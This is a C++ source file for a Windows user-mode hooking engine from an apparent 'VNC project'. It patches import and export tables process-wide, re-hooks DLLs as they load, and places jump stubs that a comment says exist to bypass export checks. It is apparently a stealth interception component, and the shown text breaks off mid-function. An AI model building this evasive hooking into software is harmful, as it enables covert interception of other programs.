//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: hook.cpp
// $Revision: 192 $
// $Date: 2014-07-11 16:53:02 +0400 (Пт, 11 июл 2014) $
// description: 
//	User-mode hooking engine implementation. Currently avaliable IAT and Export hooks.

#include "main.h"
#include "common.h"
#include "dllntfy.h"



#define _USE_JMP_STUBS	TRUE	// use jump stubs in the end of the hooked code section

static WINERROR SetExportHookInternal(
	IN		PHOOK_FUNCTION	pHookFn,		// hooked function descriptor
	IN		HMODULE			ModuleBase,		// target image base (where export should be hooked)
	IN		BOOL			bForward,		// resolve and hook forwarded export	
	IN OUT	PHOOK			pHook			//
	);


LOCKED_LIST(g_HookList);
LOCKED_LIST(g_HookDllNotificationList);

LONG	volatile	g_HookEnterCount = 0;

HMODULE*	g_ExceptionsBase	= NULL;	// Array of module bases of modules whos import shouldn't be hooked.
ULONG		g_ExceptionsCount	= 0;	// Number of bases in array

BOOL	g_HookInit = FALSE;
#if _DEBUG
LONG	g_HookCount = 0;
#endif

// Names of modules whos import shouldn't be hooked.
LPTSTR	g_ExceptedModules[] =
{
	_T("kernel32"),
	_T("ntdll"),
	_T("kernelbase")
};


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Checks if the specified module base is in exceptions list and it's import shouldn't be hooked.
//
static BOOL IsExcepted(HMODULE hModule)
{
	ULONG i;
	for (i=0; i<g_ExceptionsCount; i++)
	{
		if (hModule == g_ExceptionsBase[i])
			return(TRUE);
	}

	return(FALSE);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Allocates memory and initializes a HOOK structure.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
static INT CreateHook(
				OUT	PHOOK* ppHook	// returned pHook structure
)
{
	INT Status = NO_ERROR;
	PHOOK newHook = (PHOOK)AppAlloc(sizeof(HOOK));

	ASSERT(g_HookInit);

	if (newHook)
	{
		//memset(newHook, 0, sizeof(HOOK));
		newHook->OriginalFn    = NULL;
		newHook->OriginalEntry = NULL;
		newHook->OriginalValue = 0;
		newHook->HookFn        = NULL;
		newHook->pHookFn       = NULL;
		newHook->Flags         = 0;
		InitializeListHead(&newHook->Entry);
		*ppHook = newHook;
	}
	else
	{
		Status = GetLastError();
	}

	return(Status);
}


LONG MyUnhandledExceptionFilter( EXCEPTION_POINTERS* pep )
{
	return(EXCEPTION_EXECUTE_HANDLER);
}

//
//	Callback function.
//	Scans the global list of hooks for the specified Entry as the Original value.
//	Returns TRUE if the specified Entry belongs to the specified function.
//
static BOOL __stdcall HookIsIatEntry(
	PVOID		Entry,
	PCHAR		FunctionName,
	USHORT		Ordinal
	)
{
	BOOL	Ret = FALSE;
	PHOOK	pHook;
	PLIST_ENTRY	pEntry;
	BOOL bByOrdinal;

	g_HookList_Lock();
	pEntry = g_HookListHead.Flink;

	while(pEntry != &g_HookListHead)
	{
		pHook = CONTAINING_RECORD(pEntry, HOOK, Entry);
		bByOrdinal = ((pHook->pHookFn->Flags&HF_ORDINAL)==HF_ORDINAL);
		if (pHook->pHookFn->Original == Entry )
		{
			if ( FunctionName )
			{
				if (!strcmp(pHook->pHookFn->HookedFunction, FunctionName))
				{
					Ret = TRUE;
					break;
				}
			}
			else if ( bByOrdinal )
			{
				if ( pHook->pHookFn->HookedFunctionOrdinal == Ordinal )
				{
					Ret = TRUE;
					break;
				}
			}
		}
		pEntry = pEntry->Flink;
	}	// while(pEntry != &g_HookListHead)

	g_HookList_Unlock();

	return(Ret);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Hooks target module's IAT entry.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
WINERROR SetIatHook(
		IN  PHOOK_FUNCTION	pHookFn,	// describes function that should be hooked
		IN	HMODULE			ModuleBase,	// target image base (where IAT should be hooked)
		OUT	PHOOK*			ppHook		// optional: a hook structure returned, used to remove hook
)
{
	WINERROR Status;
	PIAT_ENTRY pIatEntry;
	PHOOK pHook;

	PCHAR  ImportedFunction = NULL;
	USHORT ImportedOrdinal = 0;


	if (IsExcepted(ModuleBase))
		// Module is in exceptions list, leaving.
		return(NO_ERROR);

	ASSERT(g_HookInit);

	if ( pHookFn->Flags & HF_ORDINAL ){
		ImportedOrdinal = pHookFn->HookedFunctionOrdinal;
	}else{
		ImportedFunction = pHookFn->HookedFunction;
	}

	if ((Status = CreateHook(&pHook)) == NO_ERROR)
	{
		if (pHookFn->Stub)
			pHook->HookFn = pHookFn->Stub;
		else
			pHook->HookFn = pHookFn->HookFn;

		__try
		{
			pIatEntry = 
				PeSupGetIatEntry(
					ModuleBase, 
					pHookFn->HokedModule, 
					ImportedFunction, 
					ImportedOrdinal,
					&HookIsIatEntry
					);
			if (!pIatEntry){
				pIatEntry = 
					PeSupGetDelayIatEntry(
						ModuleBase, 
						pHookFn->HokedModule, 
						ImportedFunction, 
						ImportedOrdinal
						);
			}

			if (pIatEntry)
			{
				ULONG OldProtect = 0;
	
				if (VirtualProtect(pIatEntry, sizeof(IAT_ENTRY), PAGE_EXECUTE_READWRITE, &OldProtect))
				{
					pHook->pHookFn = pHookFn;
					if ( pHook->pHookFn->Original == NULL ){
						pHook->pHookFn->Original = (PVOID)*pIatEntry;
					}
					pHook->OriginalFn = (PVOID)*pIatEntry;
					pHook->OriginalEntry = pIatEntry;
					pHook->OriginalValue = *pIatEntry;

#if _DEBUG
					g_HookCount += 1;
#endif
					//ASSERT(*pIatEntry != (IAT_ENTRY)pHook->HookFn);
					*pIatEntry = (IAT_ENTRY)pHook->HookFn;

					VirtualProtect(pIatEntry, sizeof(IAT_ENTRY), OldProtect, &OldProtect);

					pHook->Flags |= (HOOK_TYPE_IAT | HOOK_SET);

					g_HookList_Lock();
					InsertHeadList(&g_HookListHead, &pHook->Entry);  // Last In First Out	;)
					g_HookList_Unlock();

					Status = NO_ERROR;
					if (ppHook)
						*ppHook = pHook;
				}
				else
				{
					Status = GetLastError();
				}
			}	// if (pIatEntry)
			else
			{
				Status = ERROR_FILE_NOT_FOUND;
			}
		}
		__except(MyUnhandledExceptionFilter(GetExceptionInformation()))
		{
			Status = GetExceptionCode();
		}	

		if (Status != NO_ERROR)
			AppFree(pHook);
	}
	return(Status);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Searches for a free space within module code section(s) enough to create JMP stub.
//
static PJMP_STUB HookFindExportStub(
			IN HMODULE	ModuleBase,
			PVOID		ExportedFunction
			)
{
	PJMP_STUB	Stub = NULL;
	PLINKED_BUFFER Linked = PeSupGetFreeCodeSpace(ModuleBase);
	PLINKED_BUFFER Next;

	while (Linked)
	{
		if (!(Stub) && (Linked->Size >= sizeof(JMP_STUB)))
		{
			Stub = (PJMP_STUB)Linked->Buffer;

#ifdef	_WIN64
			if (Stub->Opcode == JMP_STUB_OPCODE && Stub->Offset == 0 && Stub->Address != (ULONG_PTR)ExportedFunction)
#else
			if (Stub->Opcode == JMP_STUB_OPCODE && ((ULONG_PTR)&Stub[1] + Stub->Offset != (ULONG_PTR)ExportedFunction))
#endif
			{
				// This stub is already used by us, try to select the next one.
				Linked->Buffer += sizeof(JMP_STUB);
				Linked->Size -= sizeof(JMP_STUB);
				Stub = NULL;
				continue;
			}
		}
		Next = Linked->Next;
		AppFree(Linked);
		Linked = Next;
	}	// while (Linked)

	return(Stub);
}

//
//	Checks if the resolved exported function specified by pHook is forwarded.
//	If so and bForward flag is set tries to resolve and hook the forwarded function.
//	In case if the function is not forwarded returns ERROR_INVALID_FUNCTION.
//
static WINERROR CheckHookExportForwarding(
	IN		PHOOK_FUNCTION	pHookFn,		// hooked function descriptor
	IN		HMODULE			ModuleBase,		// target image base (where export should be hooked)
	IN		BOOL			bForward,		// resolve and hook forwarded export	
	IN OUT	PHOOK			pHook			//
	)
{
	WINERROR Status = ERROR_INVALID_FUNCTION;
	PIMAGE_NT_HEADERS	Pe = (PIMAGE_NT_HEADERS)((PCHAR)ModuleBase + ((PIMAGE_DOS_HEADER)ModuleBase)->e_lfanew);
	PIMAGE_DATA_DIRECTORY ExportDir = (PIMAGE_DATA_DIRECTORY)&Pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	// Check if exported function RVA points into the export directory, this means this is export forwarding
	if (pHook->OriginalValue > (ULONG_PTR)ExportDir->VirtualAddress && 
		pHook->OriginalValue < ((ULONG_PTR)ExportDir->VirtualAddress + ExportDir->Size))
	{
		if (bForward)
		{
			PCHAR pModule, pFunction;
			HOOK_FUNCTION	HookFn;
			if (pModule = AppAlloc(lstrlenA((PCHAR)pHook->OriginalFn) + sizeof(CHAR)))
			{
				lstrcpyA(pModule, (PCHAR)pHook->OriginalFn);
				if (pFunction = strchr(pModule, '.'))
				{
					*pFunction = 0;
					pFunction += 1;

					HookFn.HokedModule = pModule;
					HookFn.HookedFunction = pFunction;
					HookFn.HookFn = pHookFn->HookFn;

					if (ModuleBase = GetModuleHandleA(pModule))
					{
						if ((Status = SetExportHookInternal(&HookFn, ModuleBase, FALSE, pHook)) == NO_ERROR)
						{
							pHookFn->Stub = HookFn.Stub;
							pHookFn->Original = HookFn.Original;
							ASSERT(Status == NO_ERROR);
						}
					}	// if (ModuleBase = GetModuleHandleA(pModule))
				}	// if (pFunction = strchr(pModule, '.'))
				AppFree(pModule);
			}	// if (pModule = AppAlloc(strlen((PCHAR)pHook->OriginalFn) + sizeof(CHAR)))
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;
		}	// if (bForward)
		else
			Status = ERROR_NOT_EXPORT_FORMAT;
	}	// if (pHook->OriginalValue > (ULONG_PTR)ExportDir->VirtualAddress && ...

	return(Status);
}

//
//	Hooks module's exported function.
//
static WINERROR SetExportHookInternal(
	IN		PHOOK_FUNCTION	pHookFn,		// hooked function descriptor
	IN		HMODULE			ModuleBase,		// target image base (where export should be hooked)
	IN		BOOL			bForward,		// resolve and hook forwarded export	
	IN OUT	PHOOK			pHook			// 
	)
{
	WINERROR Status;
	PEXPORT_ENTRY pExportEntry;

	ASSERT(pHookFn);
	ASSERT(ModuleBase);
	ASSERT(g_HookInit);
	ASSERT(pHook);

	__try
	{
		if ( pHookFn->Flags & HF_ORDINAL ){
			pExportEntry = PeSupGetExportEntryByOrdinal(ModuleBase, pHookFn->HookedFunctionOrdinal );			
		}else {
			pExportEntry = PeSupGetExportEntry(ModuleBase, pHookFn->HookedFunction);			
		}
		if (pExportEntry)
		{
			ULONG OldProtect = 0;

			if (VirtualProtect(pExportEntry, sizeof(EXPORT_ENTRY), PAGE_EXECUTE_READWRITE, &OldProtect))
			{					
				pHook->pHookFn = pHookFn;
				pHook->OriginalFn = (PVOID)((PCHAR)ModuleBase + *pExportEntry);
				pHook->OriginalEntry = pExportEntry;
				pHook->OriginalValue = (ULONG_PTR)(*pExportEntry);

				if ((Status = CheckHookExportForwarding(pHookFn, ModuleBase, bForward, pHook)) == ERROR_INVALID_FUNCTION)
				{
#ifdef _USE_JMP_STUBS
					// This code creates JMP XXXX stubs in the free space at the ends of the target module code sections.
					// Then theese stubs are set as hook functions and jump to original hooks.
					// The reason - to bypass possible export checks: if module export points to an other module.
					PJMP_STUB Stub = HookFindExportStub(ModuleBase, pHook->OriginalFn);
					ULONG OldStubProtect;
					if ((Stub) && (VirtualProtect(Stub, sizeof(JMP_STUB), PAGE_EXECUTE_READWRITE, &OldStubProtect)))
					{
 #ifdef _WIN64
						ASSERT(Stub->Opcode != JMP_STUB_OPCODE || (Stub->Offset == 0 && Stub->Address == (ULONG_PTR)pHook->OriginalFn));
						Stub->Offset = 0;
						Stub->Address = (ULONG_PTR)pHook->HookFn;
 #else
						ASSERT(Stub->Opcode != JMP_STUB_OPCODE || ((ULONG_PTR)&Stub[1] + Stub->Offset == (ULONG_PTR)pHook->OriginalFn));
						Stub->Offset = (ULONG)((ULONG_PTR)pHook->HookFn - (ULONG_PTR)&Stub[1]);
 #endif
						Stub->Opcode = JMP_STUB_OPCODE;
						pHook->HookFn = Stub;
						pHookFn->Stub = Stub;

						if (OldStubProtect != PAGE_EXECUTE_READWRITE)
							OldStubProtect = PAGE_EXECUTE_READ;
						VirtualProtect(Stub, sizeof(JMP_STUB), OldStubProtect, &OldStubProtect);
					}
#endif
#if _DEBUG
					g_HookCount += 1;
#endif
					ASSERT(pHook->OriginalFn != pHook->HookFn);
					*pExportEntry = (EXPORT_ENTRY)((ULONG_PTR)pHook->HookFn - (ULONG_PTR)ModuleBase);

					VirtualProtect(pExportEntry, sizeof(EXPORT_ENTRY), OldProtect, &OldProtect);

					pHook->Flags |= (HOOK_TYPE_EXPORT | HOOK_SET);

					g_HookList_Lock();
					InsertHeadList(&g_HookListHead, &pHook->Entry);		// Last In First Out	;)
					g_HookList_Unlock();

					pHookFn->Original = (PVOID)((ULONG_PTR)pHook->OriginalValue + (ULONG_PTR)ModuleBase);

					Status = NO_ERROR;
/*
					{
						//	Hook was successfully set.
						//	Now we have module's export table patched so it's entries are point to our functions.
						//	But there can be a problem with modules which have it's import bound to this module.
						//	NTDLL checks LDR_DATA_TABLE_ENTRY.TimeDateStamp of the imported module to determine if the bound import
						//	 matches it. So we have to modify this TimeDateStamp to make NTDLL resolve all import normally to
						//	 get our hooked function pointer instead of the original one.

						PLDR_DATA_TABLE_ENTRY pLdrData;

						if (pLdrData = PsSupGetLdrDataTableEnty(ModuleBase))
							pLdrData->TimeDateStamp = 0;
					}
*/
				}// if ((Status = CheckHookExportForwarding(pHookFn, ModuleBase, bForward, pHook)) == ERROR_INVALID_FUNCTION)
			}	// if (VirtualProtect(
			else{
				Status = GetLastError();
				if ( pHookFn->Flags & HF_ORDINAL ){
					DbgPrint("%s!%lu VirtualProtect failed err=%lu\n",
						pHookFn->HokedModule,
						pHookFn->HookedFunctionOrdinal,Status);
				}else{
					DbgPrint("%s!%s VirtualProtect failed err=%lu\n",
						pHookFn->HokedModule,
						pHookFn->HookedFunction,Status);
				}
			}
		}	// if (pExportEntry)
		else{
			Status = ERROR_FILE_NOT_FOUND;
			if ( pHookFn->Flags & HF_ORDINAL ){
				DbgPrint("export %s!%lu not found\n",
					pHookFn->HokedModule,
					pHookFn->HookedFunctionOrdinal);
			}else{
				DbgPrint("export %s!%s not found\n",
					pHookFn->HokedModule,
					pHookFn->HookedFunction);
			}
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		if ( pHookFn->Flags & HF_ORDINAL ){
			DbgPrint("%s!%lu exception\n",
				pHookFn->HokedModule,
				pHookFn->HookedFunctionOrdinal);
		}else{
			DbgPrint("%s!%s exception\n",
				pHookFn->HokedModule,
				pHookFn->HookedFunction);
		}
		Status = GetExceptionCode();
	}

	return(Status);
}

	

//
//	Hooks module's export table.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
WINERROR SetExportHook(
	IN	PHOOK_FUNCTION	pHookFn,		// hooked function descriptor
	IN	HMODULE			ModuleBase,		// target image base (where export should be hooked)
	IN	BOOL			bForward,		// resolve and hook forwarded export	
	OUT	PHOOK*			ppHook			// optional: a hook structure returned, used to remove hook
)
{
	WINERROR Status;
	PHOOK	pHook;

	ASSERT(pHookFn);
	ASSERT(ModuleBase);
	ASSERT(g_HookInit);

	if ((Status = CreateHook(&pHook)) == NO_ERROR)
	{
		pHook->HookFn = pHookFn->HookFn;
		if ((Status = SetExportHookInternal(pHookFn, ModuleBase, bForward, pHook)) == NO_ERROR)
		{
			if (ppHook)
				*ppHook = pHook;
		}
		else{
			DbgPrint("SetExportHookInternal failed, err= %08X\n",Status);
			AppFree(pHook);
		}
	}
	else	// if ((Status = CreateHook(&pHook)) == NO_ERROR)
	{
		DbgPrint("CreateHook failed, err=%08X\n",Status);
	}

	return(Status);
}



/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Removes a hook, described by specified HOOK structure.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
static INT RemoveHookInternal(
		IN	PHOOK pHook		// a HOOK structure, that describes a hook to remove
)
{
	INT	Status = NO_ERROR;
	ULONG OldProtect = 0;

	ASSERT(g_HookInit);
	ASSERT(pHook->Flags & HOOK_SET);

	__try
	{
		ULONG HookType = (pHook->Flags & HOOK_TYPE_MASK);
		switch (HookType)
		{
		case HOOK_TYPE_EXPORT:
			{
#ifdef _USE_JMP_STUBS
				// Adjust JMP stubs to jump directlty to a target function
				PJMP_STUB pStub = (PJMP_STUB)pHook->HookFn;
				if (pStub->Opcode == JMP_STUB_OPCODE)
				{
					if (VirtualProtect(pStub, sizeof(JMP_STUB), PAGE_EXECUTE_READWRITE, &OldProtect))
					{
#ifdef _WIN64
						ASSERT(pStub->Offset == 0);
						pStub->Address = (ULONG_PTR)pHook->OriginalFn;
#else
						pStub->Offset = (ULONG)((ULONG_PTR)pHook->OriginalFn - (ULONG_PTR)&pStub[1]);
#endif	// _WIN64
						VirtualProtect(pStub, sizeof(JMP_STUB), OldProtect, &OldProtect);
					}
				}	// if (pStub->Opcode == JMP_STUB_OPCODE)
#endif	// _USE_JMP_STUBS
			}
		case HOOK_TYPE_IAT:
			if (VirtualProtect(pHook->OriginalEntry, sizeof(ULONG_PTR), PAGE_EXECUTE_READWRITE, &OldProtect))
			{
				// NOTE: IAT_ENTRY and EXPORT_ENTRY have different sizes on x64.
				if (HookType == HOOK_TYPE_IAT)
					*(PIAT_ENTRY)pHook->OriginalEntry = (IAT_ENTRY)pHook->OriginalValue;
				else
					*(PEXPORT_ENTRY)pHook->OriginalEntry = (EXPORT_ENTRY)pHook->OriginalValue;
#if _DEBUG
				g_HookCount -= 1;
#endif
				pHook->Flags &= (~HOOK_SET);

				VirtualProtect(pHook->OriginalEntry, sizeof(ULONG_PTR), OldProtect, &OldProtect);
			}
			else
				Status = GetLastError();
			break;
		default:
			break;
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		Status = GetExceptionCode();
	}


	return(Status);
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Removes a hook, described by specified HOOK structure. Removes HOOK from the g_HookList. Frees HOOK structure. 
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
INT RemoveHook(
		IN	PHOOK pHook		// a HOOK structure, that describes a hook to remove
)
{
	INT Status = RemoveHookInternal(pHook);

	ASSERT(g_HookInit);

	g_HookList_Lock();
	RemoveEntryList(&pHook->Entry);
	g_HookList_Unlock();

	AppFree(pHook);

	return(Status);
}


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Removes registered hooks for the specified hook function. If no function specified - all hook are removed.
//	If the function succeeds, the return value is number of hooks removed. 
//	If the function fails, the return value is 0.
//
ULONG RemoveAllHooks(PHOOK_FUNCTION pHookFn)
{
	INT HookCount = 0;
	PLIST_ENTRY pFirst, pEntry;

	ASSERT(g_HookInit);

	g_HookList_Lock();

	pFirst = &g_HookListHead;
	pEntry = pFirst->Flink;

	while (pEntry != pFirst)
	{
		PHOOK pHook = CONTAINING_RECORD(pEntry, HOOK, Entry);
		ASSERT(g_HookCount > 0);

		pEntry = pEntry->Flink;

		if (pHookFn == NULL || pHookFn->HookFn == pHook->HookFn || pHookFn->Stub == pHook->HookFn)
		{
			if (RemoveHookInternal(pHook) != NO_ERROR)
			{
//				ASSERT(FALSE);
			}

			RemoveEntryList(&pHook->Entry);
			AppFree(pHook);
			HookCount += 1;
		}
	}

//	ASSERT(g_HookCount == 0 || pHookFn != NULL);
	g_HookList_Unlock();

	return(HookCount);
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Sets multiple hooks of different types described by specified array of HOOK_DESCRIPTORs.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//	
WINERROR SetMultipleHooks(
		IN	PHOOK_DESCRIPTOR	pHookDesc,		// array of HOOK_DESCRIPTOR structures
		IN	LONG				NumberHooks,	// number of elements in the array
		IN	HMODULE				ModuleBase		// Target module base (for IAT hooks only)
)
{
	WINERROR Status = ERROR_FILE_NOT_FOUND;
	LONG i;

	ASSERT(g_HookInit);

	for (i=0;i<NumberHooks;i++)
	{
		ULONG HookType = pHookDesc->Flags & HOOK_TYPE_MASK;

		switch(HookType)
		{
		case HOOK_TYPE_IAT:
			{
				if ((Status = SetIatHook(pHookDesc->pHookFn, ModuleBase, &pHookDesc->pHook)) != NO_ERROR)
				{
					if ( Status != ERROR_FILE_NOT_FOUND ){
						DbgPrint("HOOK: Import hook failed: %s!%s, status: %08X\n", 
							pHookDesc->pHookFn->HokedModule, pHookDesc->pHookFn->HookedFunction, Status);
					}
					if ( pHookDesc->Flags & HOOK_TYPE_OPTIONAL ){
						Status = NO_ERROR;
					}
				}
			}
			break;
		case HOOK_TYPE_EXPORT:
			{
				HMODULE	TargetBase = GetModuleHandleA(pHookDesc->pHookFn->HokedModule);
				if (TargetBase)
				{
					if ((Status = SetExportHook(pHookDesc->pHookFn, TargetBase, TRUE, &pHookDesc->pHook)) != NO_ERROR)
					{
						if ( Status != ERROR_FILE_NOT_FOUND ){
							DbgPrint("HOOK: Export hook failed: %s!%s, status: %08X\n", 
								pHookDesc->pHookFn->HokedModule, pHookDesc->pHookFn->HookedFunction, Status);
						}
						if ( pHookDesc->Flags & HOOK_TYPE_OPTIONAL ){
							Status = NO_ERROR;
						}
					}
				}
			}
			break;
		default:
			ASSERT(FALSE);
			break;
		}

		pHookDesc += 1;
		
	}

	return(Status);
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Removes multiple hooks of different types described by specified array of HOOK_DESCRIPTORs.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//	
WINERROR RemoveMultipleHooks(
		IN	PHOOK_DESCRIPTOR	pHookDesc,		// array of HOOK_DESCRIPTOR structures
		IN	LONG				NumberHooks		// number of elements in the array
)
{
	WINERROR Status = ERROR_FILE_NOT_FOUND;
	LONG i;

	ASSERT(g_HookInit);

	for (i=0;i<NumberHooks;i++)
	{
		if (pHookDesc->pHook)
		{
			if (RemoveHook(pHookDesc->pHook) == NO_ERROR)
				Status = NO_ERROR;
		}
		pHookDesc += 1;
	}

	return(Status);
}

INT 
	SetMultipleDllHooks(
		PHOOK_DESCRIPTOR IatHooks, 
		LONG NumberIatHooks ,
		PHOOK_DESCRIPTOR ExportHooks, 
		LONG NumberExportHooks 
		)
{
	INT Status = NO_ERROR;
	HMODULE Advapi32 = GetModuleHandleW(wczAdvapi32);

	if ((Status = SetMultipleHooks(ExportHooks, NumberExportHooks, NULL)) == NO_ERROR)
	{
		HMODULE*	ModArray = NULL;
		ULONG		ModCount = 0;

		if ((Status = PsSupGetProcessModules(GetCurrentProcess(), &ModArray, &ModCount)) == NO_ERROR)
		{
			ULONG i;

			for (i=0;i<ModCount;i++)
			{
				if ((ModArray[i] != g_CurrentModule) && (ModArray[i] != Advapi32))
					SetMultipleHooks(IatHooks, NumberIatHooks, ModArray[i]);
			}
			AppFree(ModArray);

			// Registering IAT hooks for every loaded DLL containing bound import
			SetOnDllLoadHooks(IatHooks, NumberIatHooks);
		}

		if (Status != NO_ERROR)
			RemoveMultipleHooks(ExportHooks, NumberExportHooks);

	}

	return(Status);
}

// ---- Hook DLL-load/unload notification callback --------------------------------------------------------------------------------------

//
//	While setting hooks there can be a problem with modules whoes import bound to one of the hooked modules.
//	NTDLL checks LDR_DATA_TABLE_ENTRY.TimeDateStamp of the imported module to determine if the bound import matches it.
//	If so, the loader doesn't resolve module's import and it uses pre-defined values in IAT thats are adresses of real functions.
//	To solve it we set this DLL-load notification routine, check if the loaded module has bound import and then hook it's IAT.
//
VOID __stdcall HookDllNotificationCallback(
	ULONG						NotificationReason, 
	PLDR_DLL_NOTIFICATION_DATA	NotificationData, 
	PHOOK_DLL_LOAD_NOTIFICATION	pHookNotification
	)
{
	if (NotificationReason == LDR_DLL_NOTIFICATION_REASON_LOADED)
	{
		PIMAGE_NT_HEADERS	Pe;
		Pe = (PIMAGE_NT_HEADERS)((PCHAR)NotificationData->Loaded.DllBase + ((PIMAGE_DOS_HEADER)NotificationData->Loaded.DllBase)->e_lfanew);

		// Check is the specified DLL module has Bound Import
		if (Pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size)
		{
			// Hooking IAT of the specified module
			SetMultipleHooks(pHookNotification->pHookDescriptor, pHookNotification->NumberHooks, NotificationData->Loaded.DllBase);
		}
	}	// if (NotificationReason == LDR_DLL_NOTIFICATION_REASON_LOADED)
}


//
//	Sets DLL-load notification routine to set specified IAT hooks to every loaded DLL containing bound import.
//
WINERROR SetOnDllLoadHooks(
	PHOOK_DESCRIPTOR	pHookDescriptor,
	ULONG				NumberHooks
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	PHOOK_DLL_LOAD_NOTIFICATION	pHookNotification;

	ASSERT(NumberHooks);
	ASSERT(pHookDescriptor->Flags & HOOK_TYPE_IAT);

	if (pHookNotification = AppAlloc(sizeof(HOOK_DLL_LOAD_NOTIFICATION)))
	{
		InitializeListHead(&pHookNotification->Entry);
		pHookNotification->pHookDescriptor = pHookDescriptor;
		pHookNotification->NumberHooks = NumberHooks;

		g_HookDllNotificationList_Lock();
		Status = SetDllNotificationCallback(&HookDllNotificationCallback, pHookNotification, &pHookNotification->pNotificationDescriptor);

		if (Status == NO_ERROR)
			InsertTailList(&g_HookDllNotificationListHead, &pHookNotification->Entry)
		else
			AppFree(pHookNotification);

		g_HookDllNotificationList_Unlock();
	}	// if (pHookNotification = AppAlloc(sizeof(HOOK_DLL_LOAD_NOTIFICATION)))

	return(Status);
}

//
//	Removes all registered DLL-load notification callbacks.
//
VOID	RemoveAllCallbacks(VOID)
{
	PLIST_ENTRY	pEntry = g_HookDllNotificationListHead.Flink;

	while(pEntry != &g_HookDllNotificationListHead)
	{
		PHOOK_DLL_LOAD_NOTIFICATION	pHookNotification = CONTAINING_RECORD(pEntry, HOOK_DLL_LOAD_NOTIFICATION, Entry);
		pEntry = pEntry->Flink;

		RemoveEntryList(&pHookNotification->Entry);
		RemoveDllNotificationCallback(pHookNotification->pNotificationDescriptor);
		AppFree(pHookNotification);
	}	// while(pEntry != &g_HookDllNotificationListHead)
}

// ---- Hook startup/cleanup routines -----------------------------------------------------------------------------------------------

//
//	Initializes hooking engine.
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
WINERROR InitHooks(VOID)
{
	WINERROR Status = NO_ERROR;
	ULONG i;
	ULONG ExCount = (sizeof(g_ExceptedModules) / sizeof(LPTSTR));
	if (g_ExceptionsBase = (HMODULE*)AppAlloc(ExCount * sizeof(HMODULE)))
	{
		g_HookList_Init();
		g_HookDllNotificationList_Init();

		for (i=0; i<ExCount; i++)
			g_ExceptionsBase[i] = GetModuleHandle(g_ExceptedModules[i]);
		g_ExceptionsCount = ExCount;
		
		g_HookInit = TRUE;
	}
	else
		Status = ERROR_NOT_ENOUGH_MEMORY;

	return(Status);
}



VOID WaitForHooks(VOID)
{
	LONG i = 0;
	do 
	{
		Sleep ( 200 );
	} while (g_HookEnterCount && ((i++) < 100 ) );
}

//
//	Removes all hooks and releases hooking engine
//	If the function succeeds, the return value is NO_ERROR. 
//	If the function fails, the return value is a nonzero error code defined in Winerror.h.
//
VOID CleanupHooks(VOID)
{
	if (g_HookInit)
	{
		// hooks are initialized, try to remove if any
		RemoveAllCallbacks();
		RemoveAllHooks(NULL);
		WaitForHooks();

		if ((g_ExceptionsBase) && (g_ExceptionsCount != 0))
		{
			g_ExceptionsCount = 0;
			AppFree(g_ExceptionsBase);
		}
		g_HookInit = FALSE;

		ASSERT(IsListEmpty(&g_HookDllNotificationListHead));
		ASSERT(IsListEmpty(&g_HookListHead));

		g_HookDllNotificationList_Cleanup();
		g_HookList_Cleanup();
	}
}

//////////////////////////////////////////////////////////////////////////
#ifdef _AMD64_

#pragma pack( push, 1 )
typedef struct _ASM_FIELDS {
	PVOID HookFn;
	PVOID Context;
}ASM_FIELDS,*PASM_FIELDS;
#pragma pack( pop )

extern PVOID CallStub4;
extern ULONG CallStub4SIZE;

// stub from function 
FORCEINLINE
PVOID 
	_x64MakeCallStub( 
		IN PVOID Dest,
		IN PVOID Stub,
		IN ULONG Size,
		IN PVOID Handler,
		IN PVOID Context
		)
{
	PASM_FIELDS pAsmFieldsSRC = (PASM_FIELDS)((PCHAR)Stub-sizeof(ASM_FIELDS));
	PASM_FIELDS pAsmFieldsDST = (PASM_FIELDS)Dest;
	RtlCopyMemory(Dest,pAsmFieldsSRC,Size+sizeof(ASM_FIELDS));
	pAsmFieldsDST->HookFn = Handler;
	pAsmFieldsDST->Context = Context;
	return (PVOID)((PCHAR)Dest+sizeof(ASM_FIELDS));
}

FORCEINLINE
PVOID 
	x64MakeCallStub(
		IN PVOID CallStub,
		IN PVOID Handler,
		IN PVOID Context
		)
{
	return _x64MakeCallStub(CallStub,CallStub4,CallStub4SIZE,Handler,Context);
}
#endif

PCALL_HOOK AllocateCallStub( PVOID HookFn,PVOID OriginalFn )
{
	PCALL_HOOK pHook;
	ULONG HookSize;
#ifdef _X86_
	HookSize = sizeof(CALL_HOOK);
#else
	HookSize = sizeof(CALL_HOOK)+CallStub4SIZE+sizeof(ASM_FIELDS);
#endif

	pHook = AppAlloc(HookSize);
	if ( pHook )
	{
		vProtect( pHook, HookSize );

		//ZeroMemory(pHook,HookSize);
